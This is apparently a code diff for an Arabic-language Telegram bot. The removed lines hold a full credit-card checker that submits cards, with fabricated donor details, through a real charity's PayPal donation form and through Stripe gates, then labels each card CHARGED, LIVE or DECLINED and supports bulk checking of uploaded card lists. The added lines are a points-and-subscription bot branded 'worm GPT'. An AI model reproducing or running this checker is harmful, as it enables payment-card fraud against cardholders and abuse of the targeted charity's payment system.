-            "give-amount": "1.00",
-            "give-gateway": "paypal-commerce",
-        }
-        try:
-            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
-                                  params={"action": "give_paypal_commerce_create_order"},
-                                  headers=self.ajax_headers, data=data, timeout=20)
-            rj = r.json()
-            if rj.get("success") and "data" in rj:
-                return rj["data"]["id"]
-            return None
-        except:
-            return None
-    
-    def charge_card(self, order_id: str, card: Dict[str, str], donor: Dict[str, str]) -> str:
-        addr = donor["address"]
-        graphql_h = {
-            "Host": "www.paypal.com",
-            "Paypal-Client-Context": order_id,
-            "X-App-Name": "standardcardfields",
-            "Paypal-Client-Metadata-Id": order_id,
-            "User-Agent": self.ua,
-            "Content-Type": "application/json",
-            "Origin": "https://www.paypal.com",
-            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
-            "X-Country": "US"
-        }
-        
-        query = """
-        mutation payWithCard(
-            $token: String!
-            $card: CardInput
-            $paymentToken: String
-            $phoneNumber: String
-            $firstName: String
-            $lastName: String
-            $shippingAddress: AddressInput
-            $billingAddress: AddressInput
-            $email: String
-            $currencyConversionType: CheckoutCurrencyConversionType
-            $installmentTerm: Int
-            $identityDocument: IdentityDocumentInput
-            $feeReferenceId: String
-        ) {
-            approveGuestPaymentWithCreditCard(
-                token: $token
-                card: $card
-                paymentToken: $paymentToken
-                phoneNumber: $phoneNumber
-                firstName: $firstName
-                lastName: $lastName
-                email: $email
-                shippingAddress: $shippingAddress
-                billingAddress: $billingAddress
-                currencyConversionType: $currencyConversionType
-                installmentTerm: $installmentTerm
-                identityDocument: $identityDocument
-                feeReferenceId: $feeReferenceId
-            ) {
-                flags { is3DSecureRequired }
-                cart {
-                    intent
-                    cartId
-                    buyer { userId auth { accessToken } }
-                    returnUrl { href }
-                }
-                paymentContingencies {
-                    threeDomainSecure {
-                        status method
-                        redirectUrl { href }
-                        parameter
-                    }
-                }
-            }
-        }
-        """
-        
-        full_yy = card['yy'] if len(card['yy']) == 4 else "20" + card['yy']
-        billing = {
-            "givenName": donor["first"], "familyName": donor["last"],
-            "line1": addr["line1"], "line2": None,
-            "city": addr["city"], "state": addr["state"],
-            "postalCode": addr["zip"], "country": "US"
-        }
-        
-        variables = {
-            "token": order_id,
-            "card": {
-                "cardNumber": card["number"],
-                "type": self.detect_type(card["number"]),
-                "expirationDate": f"{card['mm']}/{full_yy}",
-                "postalCode": addr["zip"],
-                "securityCode": card["cvc"]
-            },
-            "phoneNumber": donor["phone"],
-            "firstName": donor["first"],
-            "lastName": donor["last"],
-            "email": donor["email"],
-            "billingAddress": billing,
-            "shippingAddress": billing,
-            "currencyConversionType": "PAYPAL"
-        }
-        
-        try:
-            r = requests.post(
-                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
-                headers=graphql_h,
-                json={"query": query, "variables": variables},
-                timeout=30
-            )
-            return r.text
-        except Exception as e:
-            return f"ERROR: {e}"
-    
-    def approve_order(self, order_id: str) -> str:
-        data = {
-            "give-honeypot": "",
-            "give-form-id-prefix": self.tokens.get('pfx', ''),
-            "give-form-id": self.tokens.get('id', ''),
-            "give-form-hash": self.tokens.get('hash', ''),
-            "payment-mode": "paypal-commerce",
-            "give-amount": "1.00",
-            "give-gateway": "paypal-commerce",
-        }
-        try:
-            r = self.session.post(
-                "https://awwatersheds.org/wp-admin/admin-ajax.php",
-                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
-                headers=self.ajax_headers, data=data, timeout=30
-            )
-            return r.text
-        except Exception as e:
-            return f"ERROR: {e}"
-    
-    def analyze_response(self, paypal_text: str, approve_text: str = "") -> Dict[str, str]:
-        t = paypal_text.upper() if paypal_text else ""
-        
-        if 'APPROVESTATE":"APPROVED' in t:
-            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Payment Approved!"}
-        if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
-            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Auth Successful!"}
-        if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
-            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED!"}
-        if 'CVV2_FAILURE' in t:
-            return {"status": "APPROVED", "emoji": "✅", "msg": "CVV2 FAILURE (Card is LIVE)"}
-        if 'INVALID_SECURITY_CODE' in t:
-            return {"status": "APPROVED", "emoji": "✅", "msg": "Invalid Security Code (LIVE)"}
-        if 'INVALID_BILLING_ADDRESS' in t:
-            return {"status": "APPROVED", "emoji": "✅", "msg": "AVS FAILED (LIVE)"}
-        if 'EXISTING_ACCOUNT_RESTRICTED' in t:
-            return {"status": "APPROVED", "emoji": "✅", "msg": "Account Restricted (LIVE)"}
-        if 'INSUFFICIENT_FUNDS' in t:
-            return {"status": "LIVE", "emoji": "💰", "msg": "Insufficient Funds (LIVE CARD)"}
-        
-        combined = t + " " + (approve_text.upper() if approve_text else "")
-        declines = [
-            ('DO_NOT_HONOR', 'Do Not Honor'),
-            ('ACCOUNT_CLOSED', 'Account Closed'),
-            ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'Account Locked/Closed'),
-            ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
-            ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
-            ('INVALID_ACCOUNT', 'INVALID ACCOUNT'),
-            ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT NOT PERMITTED'),
-            ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT BLOCKED BY ISSUER'),
-            ('ORDER_NOT_APPROVED', 'ORDER NOT APPROVED'),
-            ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP CARD'),
-            ('PAYER_CANNOT_PAY', 'PAYER CANNOT PAY'),
-            ('GENERIC_DECLINE', 'GENERIC DECLINE'),
-            ('COMPLIANCE_VIOLATION', 'COMPLIANCE VIOLATION'),
-            ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION NOT PERMITTED'),
-            ('PAYMENT_DENIED', 'PAYMENT DENIED'),
-            ('INVALID_TRANSACTION', 'INVALID TRANSACTION'),
-            ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED/INACTIVE ACCOUNT'),
-            ('SECURITY_VIOLATION', 'SECURITY VIOLATION'),
-            ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
-            ('INVALID_OR_RESTRICTED_CARD', 'INVALID/RESTRICTED CARD'),
-            ('EXPIRED_CARD', 'EXPIRED CARD'),
-            ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC FAILURE'),
-            ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
-            ('DECLINED_PLEASE_RETRY', 'DECLINED - RETRY LATER'),
-            ('TX_ATTEMPTS_EXCEED_LIMIT', 'TX ATTEMPTS EXCEED LIMIT'),
-        ]
-        for keyword, msg in declines:
-            if keyword in combined:
-                return {"status": "DECLINED", "emoji": "❌", "msg": msg}
-        
-        try:
-            rj = json.loads(paypal_text)
-            if "errors" in rj:
-                return {"status": "DECLINED", "emoji": "❌", "msg": rj["errors"][0].get("message", "Unknown")}
-        except:
+            invited_by = int(args[0].replace("ref_", ""))
+            if invited_by == user.id:
+                invited_by = None
+        except ValueError:
             pass
-        try:
-            rj = json.loads(approve_text)
-            if rj.get("data", {}).get("error"):
-                return {"status": "DECLINED", "emoji": "❌", "msg": str(rj["data"]["error"])}
-        except:
-            pass
-        
-        return {"status": "DECLINED", "emoji": "❌", "msg": "UNKNOWN ERROR"}
-    
-    def check_card(self, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            cc_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
-            card_info = {
-                "number": card_data['number'],
-                "mm": card_data['month'].zfill(2),
-                "yy": card_data['year'],
-                "cvc": card_data['cvv']
-            }
-            if len(card_info['yy']) == 2:
-                card_info['yy'] = "20" + card_info['yy']
-            
-            donor = self.random_donor()
-            
-            if not self.scrape_tokens():
-                return False, f"Token scrape failed: {self.last_error}"
-            
-            if not self.register_donation(donor):
-                return False, "Donation registration failed"
-            
-            order_id = self.create_order()
-            if not order_id:
-                return False, "PayPal order creation failed"
-            
-            graphql_resp = self.charge_card(order_id, card_info, donor)
-            approve_resp = self.approve_order(order_id)
-            
-            result = self.analyze_response(graphql_resp, approve_resp)
-            
-            is_approved = result["status"] in ["CHARGED", "APPROVED", "LIVE"]
-            return is_approved, f"{result['emoji']} {result['status']}: {result['msg']}"
-            
-        except Exception as e:
-            return False, f"Error: {str(e)[:50]}"
 
-# ==================== بوابات الفحص ====================
-class RealGateways:
-    def __init__(self):
-        self.stripe = StripeAuthGateway()
-        self.real = RealCheckGateway()
-        self.paypal = PayPalGateway()
-    
-    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
-        if gate == 'stripe':
-            return await self.stripe.check_card(card)
-        elif gate == 'real':
-            return await self.real.check_card(card)
-        elif gate == 'paypal':
-            return await asyncio.get_event_loop().run_in_executor(None, self.paypal.check_card, card)
-        return False, "❌ بوابة غير مدعومة"
+    _, is_new = await db.register_user(user.id, user.username, user.first_name, invited_by)
+    admin = is_admin(user.id)
+    context.user_data["state"] = "main"
 
-# ==================== واجهة المستخدم ====================
-class UserInterface:
-    @staticmethod
-    def main_buttons():
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"),
-            InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
-            InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
-        )
-        return markup
-    
-    @staticmethod
-    def stop_button():
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"))
-        return markup
+    txt = f"👋 أهلاً *{user.first_name}*!\n\n🤖 *worm GPT 👹* — بوت إدارة الاشتراكات\n\n"
+    if is_new:
+        txt += "🎉 تم تسجيلك بنجاح!\n"
+        if invited_by:
+            txt += "🎁 حصل داعيك على نقطة!\n"
+        txt += "\n"
+    txt += "استخدم الأزرار بالأسفل:"
+    await update.message.reply_text(txt, parse_mode="Markdown", reply_markup=kb_main(admin))
 
-# ==================== معالج الأوامر ====================
-class CommandHandler:
-    def __init__(self):
-        self.gateways = RealGateways()
-        self.ui = UserInterface()
-        self.user_last_file = user_last_file
-    
-    def check_access(self, message) -> bool:
-        return DataManager.check_access(message.from_user.id, message.chat.id)
-    
-    def save_last_file(self, user_id: int, file_id: str, file_name: str, content: str):
-        self.user_last_file[user_id] = {"file_id": file_id, "file_name": file_name, "content": content, "timestamp": datetime.now().isoformat()}
-    
-    def get_last_file(self, user_id: int) -> Optional[Dict]:
-        return self.user_last_file.get(user_id)
-    
-    def is_user_checking(self, user_id: int) -> bool:
-        with active_checks_lock:
-            return user_id in user_active_checks
-    
-    def set_user_checking(self, user_id: int, check_id: str):
-        with active_checks_lock:
-            user_active_checks[user_id] = check_id
-    
-    def clear_user_checking(self, user_id: int):
-        with active_checks_lock:
-            if user_id in user_active_checks:
-                del user_active_checks[user_id]
-    
-    def handle_start(self, message):
-        user = message.from_user
-        users = DataManager.load_users()
-        if str(user.id) not in users:
-            users[str(user.id)] = {"user_id": user.id, "username": user.username, "first_name": user.first_name, "joined_date": datetime.now().isoformat(), "is_admin": user.id in ADMIN_IDS, "usage": {"total_checks": 0, "approved": 0, "declined": 0}, "default_gate": "stripe"}
-            DataManager.save_users(users)
-        
-        default_gate = DataManager.get_user_default_gate(user.id)
-        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe Auth (UwU)")
-        
-        welcome = f"""
-✨ <b>مرحباً بك في بوت Obeida Online</b> ✨
+async def handle_drop_entry(update, context, token):
+    user = update.effective_user
+    await db.register_user(user.id, user.username, user.first_name)
+    admin = is_admin(user.id)
+    drop = await db.get_drop(token)
+    if not drop or not drop["is_active"] or drop["claimed_by"]:
+        await update.message.reply_text("😔 *حظاً أوفر!* الكود مأخوذ مسبقاً.",
+                                          parse_mode="Markdown", reply_markup=kb_main(admin))
+        return
+    drop_info = SUBSCRIPTION_TYPES.get(drop["plan"], {})
+    api_plan = drop_info.get("api_plan", drop["plan"])
+    await update.message.reply_text("🎁 جاري إنشاء كودك...", reply_markup=kb_main(admin))
+    result = await api.create(api_plan, drop["days"], 1)
+    if not result["ok"]:
+        await update.message.reply_text(f"❌ فشل: {result.get('message', 'غير معروف')}",
+                                          reply_markup=kb_main(admin))
+        return
+    code = extract_code(result["data"])
+    if not code:
+        await update.message.reply_text("⚠️ الكود مفقود، أبلغ المشرف.", reply_markup=kb_main(admin))
+        return
+    await db.claim_drop(token, user.id, code)
+    await db.save_subscription(user.id, {"code": code, "plan": drop["plan"],
+        "actual_plan": api_plan, "days": drop["days"],
+        "max_uses": 1, "points_spent": 0, "response": result["data"]})
+    info = SUBSCRIPTION_TYPES.get(drop["plan"], {"emoji": "📦", "name": drop["plan"]})
+    await update.message.reply_text(
+        f"🎉 *مبروك!*\n\n{info['emoji']} {info['name']}\n📅 {drop['days']} يوم\n🔑 `{code}`\n\n📖 {SITE_URL}",
+        parse_mode="Markdown", reply_markup=kb_main(admin))
 
-<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
-<b>💡 البوت مجاني بالكامل للجميع!</b>
+async def handle_points_drop_entry(update, context, token):
+    user = update.effective_user
+    await db.register_user(user.id, user.username, user.first_name)
+    admin = is_admin(user.id)
+    pd = await db.get_points_drop(token)
+    if not pd or not pd["is_active"] or pd["claimed_by"]:
+        await update.message.reply_text("😔 *حظاً أوفر!*", parse_mode="Markdown",
+                                          reply_markup=kb_main(admin))
+        return
+    await db.claim_points_drop(token, user.id)
+    await db.add_points(user.id, pd["points"], "points_drop_claim", pd["id"])
+    await update.message.reply_text(f"🎉 *مبروك!* حصلت على {pd['points']} نقطة!",
+                                      parse_mode="Markdown", reply_markup=kb_main(admin))
 
-<b>📝 البوابات المتاحة:</b>
-💳 Stripe Auth (UwU) - فحص عبر SetupIntent
-✅ Real Check - فحص حقيقي
-💰 PayPal - فحص PayPal
+# ═══════════════════════════════════════════════════════════════════
+# 🏠 القوائم
+# ═══════════════════════════════════════════════════════════════════
 
-<b>📝 الأوامر:</b>
-/st [البطاقة] - فحص عبر Stripe Auth
-/chk [البطاقة] - فحص عبر Real Check
-/pp [البطاقة] - فحص عبر PayPal
-/mass [ملف] - فحص ملف عبر Stripe Auth
-/chkm [ملف] - فحص ملف عبر Real Check
-/ppm [ملف] - فحص ملف عبر PayPal
-/stop - إيقاف الفحص
-/profile - عرض إحصائياتك
-/stats - إحصائيات البوت
-/default [stripe/real/paypal] - تغيير البوابة
-/lastfile - فحص آخر ملف
+async def show_home(update, context):
+    admin = is_admin(update.effective_user.id)
+    context.user_data["state"] = "main"
+    await update.message.reply_text("🏠 *القائمة الرئيسية*", parse_mode="Markdown",
+                                      reply_markup=kb_main(admin))
 
-<b>📢 القناة:</b> {CHANNEL_USERNAME}
-<b>👨‍💻 المطور:</b> {DEV_CONTACT}
-"""
-        bot.send_message(message.chat.id, welcome, parse_mode='HTML', reply_markup=self.ui.main_buttons())
-    
-    def handle_stop(self, message):
-        user_id = message.from_user.id
-        with active_checks_lock:
-            if user_id in user_active_checks:
-                del user_active_checks[user_id]
-                bot.reply_to(message, "⛔ <b>تم إيقاف الفحص</b>", parse_mode='HTML')
-            else:
-                bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط</b>", parse_mode='HTML')
-    
-    def handle_profile(self, message):
-        user_id = message.from_user.id
-        users = DataManager.load_users()
-        data = users.get(str(user_id), {})
-        usage = data.get('usage', {})
-        default_gate = data.get('default_gate', 'stripe')
-        total = usage.get('total_checks', 0)
-        approved = usage.get('approved', 0)
-        
-        profile = f"""
-👤 <b>الملف الشخصي</b>
-━━━━━━━━━━━━
-<b>🆔 المعرف:</b> <code>{user_id}</code>
-<b>🚪 البوابة:</b> {GATES.get(default_gate, {}).get('name', 'Stripe Auth')}
-<b>📊 الإحصائيات:</b>
-• إجمالي: {total}
-• ✅ المقبولة: {approved}
-• 📈 النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
-━━━━━━━━━━━━
-🆔 Obeida Online
-"""
-        bot.reply_to(message, profile, parse_mode='HTML')
-    
-    def handle_stats(self, message):
-        stats = DataManager.load_stats()
-        total = stats.get('total_checks', 0)
-        approved = stats.get('total_approved', 0)
-        
-        text = f"""
-📊 <b>إحصائيات البوت</b>
-━━━━━━━━━━━━
-📈 <b>الإجمالي:</b> {total} فحص
-✅ المقبولة: {approved}
-📊 النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
-━━━━━━━━━━━━
-🆔 Obeida Online
-"""
-        bot.reply_to(message, text, parse_mode='HTML')
-    
-    def handle_default_gate(self, message):
-        parts = message.text.strip().split()
-        if len(parts) < 2:
-            current = DataManager.get_user_default_gate(message.from_user.id)
-            bot.reply_to(message, f"⚙️ البوابة الحالية: {GATES[current]['name']}\nللتغيير: <code>/default stripe</code> أو <code>/default real</code> أو <code>/default paypal</code>", parse_mode='HTML')
-            return
-        
-        gate = parts[1].lower()
-        if gate not in GATES:
-            bot.reply_to(message, "❌ بوابة غير موجودة\nالبوابات المتاحة: stripe, real, paypal", parse_mode='HTML')
-            return
-        
-        if DataManager.set_user_default_gate(message.from_user.id, gate):
-            bot.reply_to(message, f"✅ تم تعيين {GATES[gate]['name']}", parse_mode='HTML')
-    
-    def check_single_card(self, message, card: Dict, gate: str):
-        user_id = message.from_user.id
-        gate_name = GATES[gate]['name']
-        masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
-        
-        if self.is_user_checking(user_id):
-            bot.reply_to(message, "⚠️ <b>لديك فحص نشط</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
-            return
-        
-        check_id = str(int(time.time() * 1000))
-        self.set_user_checking(user_id, check_id)
-        
-        def run_check():
-            try:
-                self._run_single_check(message, card, gate, gate_name, masked_card, user_id, check_id)
-            finally:
-                self.clear_user_checking(user_id)
-        
-        threading.Thread(target=run_check, daemon=True).start()
-    
-    def _run_single_check(self, message, card, gate, gate_name, masked_card, user_id, check_id):
-        try:
-            progress_msg = bot.reply_to(message, f"""
-🚀 جاري الفحص 🚀
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+async def show_shop(update, context):
+    user = await db.get_user(update.effective_user.id)
+    context.user_data["state"] = "shop"
+    context.user_data.pop("buy", None)
+    await update.message.reply_text(
+        f"🛒 *المتجر*\n\n💎 رصيدك: `{user['points']}`\n\n"
+        f"📦 *الخطط المتاحة:*\n"
+        f"⭐ بلس — من 5 نقاط\n"
+        f"💎 برو — من 8 نقاط\n"
+        f"👑 بريميوم — من 15 نقطة\n\n"
+        f"اختر نوع الاشتراك:",
+        parse_mode="Markdown", reply_markup=kb_shop())
 
-𒊹︎︎︎ 𝗖𝗖 ⌁ {masked_card}
-𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق ...
-""", parse_mode='HTML', reply_markup=self.ui.stop_button())
-            
-            message_id = progress_msg.message_id
-            chat_id = progress_msg.chat.id
-            
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
-            loop.close()
-            
-            if not self.is_user_checking(user_id) or user_active_checks.get(user_id) != check_id:
-                bot.edit_message_text("⛔ تم إيقاف الفحص", chat_id, message_id, parse_mode='HTML')
-                return
-            
-            DataManager.update_usage(user_id, gate, resp)
-            DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
-            
-            if gate == 'paypal':
-                cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
-                status = "CHARGED" if approved else "DECLINED"
-                DataManager.save_paypal_result(cc_str, status, resp)
-            
-            bin_info = Helpers.get_bin_info(card['number'][:6])
-            final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
-            bot.edit_message_text(final_result, chat_id, message_id, parse_mode='HTML')
-            
-        except Exception as e:
-            print(f"Error: {e}")
-    
-    def check_multiple_cards(self, message, cards: List[Dict], gate: str):
-        user_id = message.from_user.id
-        gate_name = GATES[gate]['name']
-        
-        if self.is_user_checking(user_id):
-            bot.reply_to(message, "⚠️ <b>لديك فحص نشط</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
-            return
-        
-        check_id = str(int(time.time() * 1000))
-        self.set_user_checking(user_id, check_id)
-        
-        def run_mass():
-            try:
-                self._run_mass_check(message, cards, gate, gate_name, user_id, check_id)
-            finally:
-                self.clear_user_checking(user_id)
-        
-        threading.Thread(target=run_mass, daemon=True).start()
-    
-    def _run_mass_check(self, message, cards, gate, gate_name, user_id, check_id):
-        try:
-            total = len(cards)
-            delay = DataManager.load_settings().get("delay_between_cards", 3)
-            
-            start_msg = bot.reply_to(message, f"""
-🚀 بدء الفحص 🚀
-━━━━━━━━━━━━
-📊 البطاقات: {total}
-🚪 البوابة: {gate_name}
-━━━━━━━━━━━━
-✅ المقبولة: 0
-❌ المرفوضة: 0
-""", parse_mode='HTML', reply_markup=self.ui.stop_button())
-            
-            msg_id = start_msg.message_id
-            chat_id = start_msg.chat.id
-            approved_count = 0
-            
-            for i, card in enumerate(cards, 1):
-                if not self.is_user_checking(user_id) or user_active_checks.get(user_id) != check_id:
-                    bot.edit_message_text("⛔ تم إيقاف الفحص", chat_id, msg_id, parse_mode='HTML')
-                    return
-                
-                try:
-                    bot.edit_message_text(f"""
-🚀 جاري الفحص 🚀
-━━━━━━━━━━━━
-🔄 {i}/{total}
-✅ المقبولة: {approved_count}
-""", chat_id, msg_id, parse_mode='HTML', reply_markup=self.ui.stop_button())
-                    
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
-                    loop.close()
-                    
-                    if approved:
-                        approved_count += 1
-                        bin_info = Helpers.get_bin_info(card['number'][:6])
-                        bot.send_message(chat_id, f"""
-✅ <b>بطاقة مقبولة</b>
-━━━━━━━━━━━━
-<b>💳 البطاقة:</b> <code>{card['original']}</code>
-<b>🏷️ النوع:</b> {bin_info.get('brand', 'Unknown')}
-<b>🏦 البنك:</b> {bin_info.get('bank', 'Unknown')}
-<b>🌍 الدولة:</b> {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
-""", parse_mode='HTML')
-                    
-                    DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
-                    DataManager.update_usage(user_id, gate, resp)
-                    
-                    if gate == 'paypal':
-                        cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
-                        status = "CHARGED" if approved else "DECLINED"
-                        DataManager.save_paypal_result(cc_str, status, resp)
-                    
-                    time.sleep(delay)
-                    
-                except Exception as e:
-                    print(f"Error: {e}")
-            
-            bot.edit_message_text(f"""
-🚀 اكتمل الفحص 🚀
-━━━━━━━━━━━━
-✅ المقبولة: {approved_count}
-❌ المرفوضة: {total - approved_count}
-━━━━━━━━━━━━
-🆔 Obeida Online
-""", chat_id, msg_id, parse_mode='HTML')
-            
-        except Exception as e:
-            print(f"Error: {e}")
-    
-    def handle_single(self, message, gate):
-        if not self.check_access(message):
-            return
-        parts = message.text.strip().split(' ', 1)
-        if len(parts) < 2:
-            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv")
-            return
-        card = Helpers.parse_card(parts[1])
-        if not card:
-            bot.reply_to(message, "❌ صيغة غير صحيحة\nمثال: 4111111111111111|12|25|123")
-            return
-        self.check_single_card(message, card, gate)
-    
-    def handle_mass(self, message, gate):
-        if not self.check_access(message):
-            return
-        if message.document:
-            self.handle_file_upload(message, gate)
-        else:
-            last = self.get_last_file(message.from_user.id)
-            if last:
-                cards = Helpers.extract_cards_from_text(last["content"])
-                if cards:
-                    bot.reply_to(message, f"📁 {last['file_name']}\n📊 {len(cards)} بطاقة")
-                    self.check_multiple_cards(message, cards, gate)
-                else:
-                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
-            else:
-                bot.reply_to(message, f"📁 أرسل ملف txt\nاستخدم: /{GATES[gate]['mass_command']}")
-    
-    def handle_file_upload(self, message, gate=None):
-        try:
-            file = bot.get_file(message.document.file_id)
-            content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
-            cards = Helpers.extract_cards_from_text(content)
-            if not cards:
-                bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
-                return
-            self.save_last_file(message.from_user.id, message.document.file_id, message.document.file_name, content)
-            if gate is None:
-                gate = DataManager.get_user_default_gate(message.from_user.id)
-            bot.reply_to(message, f"📁 {message.document.file_name}\n📊 {len(cards)} بطاقة")
-            self.check_multiple_cards(message, cards, gate)
-        except Exception as e:
-            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}")
-    
-    def check_last_file(self, message):
-        last = self.get_last_file(message.from_user.id)
-        if not last:
-            bot.reply_to(message, "❌ لم ترسل أي ملف من قبل")
-            return
-        cards = Helpers.extract_cards_from_text(last["content"])
-        if not cards:
-            bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
-            return
-        gate = DataManager.get_user_default_gate(message.from_user.id)
-        self.check_multiple_cards(message, cards, gate)
+async def show_subs(update, context):
+    subs = await db.get_user_subs(update.effective_user.id)
+    admin = is_admin(update.effective_user.id)
+    if not subs:
+        await update.message.reply_text("📭 لا يوجد اشتراكات بعد.",
+                                          reply_markup=kb_main(admin)); return
+    lines = ["📋 *اشتراكاتك:*\n"]
+    for i, s in enumerate(subs[:15], 1):
+        info = SUBSCRIPTION_TYPES.get(s["plan"], {"emoji": "📦", "name": s["plan"]})
+        lines.append(f"{i}. {info['emoji']} {info['name']} — {s['days']}ي — {s['created_at'][:10]}")
+    if len(subs) > 15:
+        lines.append(f"\n... و {len(subs) - 15} أخرى")
+    await update.message.reply_text("\n".join(lines), parse_mode="Markdown",
+                                      reply_markup=kb_main(admin))
 
-# ==================== معالج الكول باك ====================
-class CallbackHandler:
-    def __init__(self, handler):
-        self.handler = handler
-    
-    def handle(self, call):
-        if call.data == "stop_check":
-            self.handler.handle_stop(call.message)
-            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")
+async def show_wallet(update, context):
+    u = await db.get_user(update.effective_user.id)
+    rank, total = await db.get_user_rank(update.effective_user.id)
+    context.user_data["state"] = "wallet"
+    await update.message.reply_text(
+        f"💎 *محفظتي*\n\n💰 الرصيد: `{u['points']}`\n"
+        f"🏆 الترتيب: `{rank}` من `{total}`\n📈 إجمالي: `{u['total_points_earned']}`",
+        parse_mode="Markdown", reply_markup=kb_wallet())
 
-# ==================== خادم الويب ====================
-def run_web_server():
+async def show_earn(update, context):
+    context.user_data["state"] = "earn"
+    await update.message.reply_text(
+        "🎁 *كسب النقاط*\n\n"
+        "1️⃣ المكافأة اليومية\n2️⃣ دعوة الأصدقاء\n"
+        "3️⃣ استلام تحويلات\n4️⃣ دروب النقاط\n\nاختر:",
+        parse_mode="Markdown", reply_markup=kb_earn())
+
+async def show_top(update, context):
+    top = await db.top_users(5)
+    user_id = update.effective_user.id
+    my_rank, total = await db.get_user_rank(user_id)
+    me = await db.get_user(user_id)
+    lines = ["🏆 *أفضل 5:*\n"]
+    for i, u in enumerate(top, 1):
+        medal = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣"][i-1]
+        name = u.get("first_name") or "مستخدم"
+        username = u.get("username")
+        ref = f"@{username}" if username else f"`{u['user_id']}`"
+        marker = " ← *أنت*" if u["user_id"] == user_id else ""
+        lines.append(f"{medal} *{name}* — {ref}\n   💎 {u['points']}{marker}")
+    lines.append("\n" + "─" * 15)
+    if my_rank <= 5:
+        lines.append(f"🎯 *ترتيبك:* {my_rank}")
+    elif my_rank > 0:
+        diff = top[-1]["points"] - me["points"] if top else 0
+        lines.append(f"🎯 *ترتيبك:* `{my_rank}` من `{total}`\n"
+                     f"💎 `{me['points']}`\n⬆️ تحتاج `{max(1, diff+1)}` نقطة")
+    await update.message.reply_text("\n".join(lines), parse_mode="Markdown",
+                                      reply_markup=kb_main(is_admin(user_id)))
+
+async def show_guide(update, context):
+    last_sub = await db.get_last_sub_code(update.effective_user.id)
+    guide = (
+        "📖 *دليل التفعيل*\n\n"
+        "1️⃣ افتح الموقع\n2️⃣ سجّل الدخول\n"
+        "3️⃣ القائمة الجانبية (☰)\n4️⃣ قسم الخطط\n"
+        "5️⃣ انزل → \"كود التفعيل\"\n6️⃣ الصق → تفعيل ✅\n\n"
+    )
+    if last_sub:
+        guide += f"─────────────────\n🔑 *آخر كود:*\n`{last_sub['code']}`\n\n📦 {last_sub['plan']} — {last_sub['days']}ي"
+    else:
+        guide += "─────────────────\n⚠️ لا تملك كوداً بعد."
+    guide += f"\n\n🌐 {SITE_URL}"
+    await update.message.reply_text(guide, parse_mode="Markdown",
+                                      reply_markup=kb_main(is_admin(update.effective_user.id)),
+                                      disable_web_page_preview=True)
+
+async def show_about(update, context):
+    types = "\n".join([f"{i['emoji']} *{i['name']}* — {i['description']}"
